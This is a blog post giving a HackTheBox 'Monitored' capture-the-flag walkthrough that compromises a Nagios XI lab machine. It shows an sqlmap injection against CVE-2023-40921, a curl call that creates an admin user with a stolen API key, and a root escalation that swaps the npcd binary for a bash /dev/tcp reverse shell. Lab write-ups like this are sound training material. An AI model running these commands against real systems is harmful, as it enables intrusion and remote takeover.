---
layout: post
title: "Monitored 5072dccbda244138834a1e9fcdcde283"
date:   2025-07-10 12:05:57 -0400
categories: writeups
---

# Monitored

HackTheBox: Medium

<aside>
ðŸ’¡ Monitored is a machine with a service powered by nagiosxi which is useful for IT infrastructure monitoring

</aside>

## 1: Enumeration

- nmap scanning

 

![Untitled]({{ '/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled.png' | relative_url }})

![Untitled]({{ '/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_1.png' | relative_url }})

After some re-search we find some vulnerabilities with a possible slq injection but we need some creds with low privileges

![Untitled]({{ '/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_2.png' | relative_url }})

## 2: User flag

> If we perform a snmpwalk to get a full list about allow gadgets in the network
> 

There we find some creds, they are no useful for the main page but we can try with sqlmap

> Looking fo vulnerabilities we find a specific url which doesnâ€™t has sanitization in a parameter (id) (CVE-2023-40921)
> 

```bash
sqlmap -u <url> --data "user&password" --level 5 --risk 3 -p id --batch(automatic) -D(db)
nagxi -T(table) --dump(get data)
```

![Untitled]({{ '/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_3.png' | relative_url }})

![Untitled]({{ '/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_4.png' | relative_url }})

> Now we have an auth token and we are able to create a new user for nagios
> 

```bash
curl -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=admin111&password=admin111&name=Admin111&email=admin111@localhost&auth_level=admin"
```

We get into nagios dashboard in the route 

1. Core config 
2. Commands and create a new command(rev shell)
3. apply conf
4. Monitoringâ†’hostâ†’localâ†’checkcommand
5. Listen on specific port and user flag got it

## 3: Priv esc

```bash
[linpeas.sh](http://linpeas.sh/):
/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path
/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
/etc/systemd/system/multi-user.target.wants/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
/etc/systemd/system/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
```

We can modify /usr/local/nagios/bin/npcd file.

Check out what we can run as root:

```bash
sudo -l:
....
/usr/local/nagiosxi/scripts/manage_services.sh *
```

We can start/stop npcd.service.

```bash
$ sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
$ rm npcd

## pass a new npcd file with the rev shell lines (Dont try to modify a bin
##in those conditions is almost imposible)

#!/bin/bash

## bash -i >& /dev/tcp/YOUR-IP/YOUR-PORT 0>&1

##Start nc on your local machine, then:
$ sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
```

machine pwned!!!!